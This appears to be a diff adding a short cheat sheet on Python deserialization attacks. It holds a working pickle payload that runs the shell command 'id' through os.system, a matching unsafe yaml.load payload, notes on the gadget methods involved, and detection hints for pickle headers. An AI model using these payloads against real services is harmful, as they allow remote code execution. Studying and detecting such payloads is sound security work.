@@ -1,0 +1,12 @@
+gASVAAAAAAAA  # Python pickle Base64 prefix
+# Pickle RCE via __reduce__
+cos
+system
+(S'id'
+tR.
+# Pickle common gadgets:
+# __reduce__ → execute command
+# __getstate__ → return malicious state object
+# __setstate__ → process malicious data
+# Detection: gASV base64 prefix, or \x80\x04\x95 pickle protocol headers
+# yaml.load() unsafe: !!python/object/apply:os.system ["id"]
